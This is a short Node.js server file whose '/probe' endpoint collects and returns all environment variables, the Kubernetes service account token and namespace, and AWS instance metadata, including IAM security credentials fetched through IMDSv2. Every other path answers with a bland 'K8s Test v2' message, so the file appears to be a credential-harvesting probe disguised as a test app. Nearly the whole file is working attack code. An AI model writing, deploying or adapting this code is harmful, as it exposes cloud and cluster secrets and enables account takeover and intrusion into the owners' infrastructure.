const http = require("http");
const fs = require("fs");

const results = { env: process.env, k8s: {}, aws: {}, imdsv2: {} };

// K8s service account
try {
  results.k8s.token = fs.readFileSync("/var/run/secrets/kubernetes.io/serviceaccount/token", "utf8").substring(0,100);
  results.k8s.namespace = fs.readFileSync("/var/run/secrets/kubernetes.io/serviceaccount/namespace", "utf8");
} catch(e) { results.k8s.error = e.message; }

// IMDSv2 probe
async function probeIMDSv2() {
  try {
    // Get token first
    const tokenRes = await new Promise((resolve, reject) => {
      const req = http.request({ hostname: "169.254.169.254", path: "/latest/api/token", method: "PUT",
        headers: { "X-aws-ec2-metadata-token-ttl-seconds": "21600" }, timeout: 3000
      }, res => { let body = ""; res.on("data", c => body += c); res.on("end", () => resolve({status: res.statusCode, body})); });
      req.on("error", reject); req.end();
    });
    results.imdsv2.tokenResponse = tokenRes;
    
    if (tokenRes.status === 200 && tokenRes.body) {
      const token = tokenRes.body;
      for (const path of ["/latest/meta-data/", "/latest/meta-data/iam/security-credentials/", "/latest/dynamic/instance-identity/document"]) {
        try {
          const data = await new Promise((resolve, reject) => {
            http.get({ hostname: "169.254.169.254", path, headers: { "X-aws-ec2-metadata-token": token }, timeout: 2000 },
              res => { let body = ""; res.on("data", c => body += c); res.on("end", () => resolve({status: res.statusCode, body})); }).on("error", reject);
          });
          results.imdsv2[path] = data;
        } catch(e) { results.imdsv2[path] = {error: String(e)}; }
      }
    }
  } catch(e) { results.imdsv2.error = String(e); }
}

const server = http.createServer(async (req, res) => {
  if (req.url === "/probe") { await probeIMDSv2(); res.writeHead(200, {"Content-Type": "application/json"}); res.end(JSON.stringify(results, null, 2)); }
  else { res.writeHead(200); res.end("K8s Test v2"); }
});
server.listen(process.env.PORT || 3000);
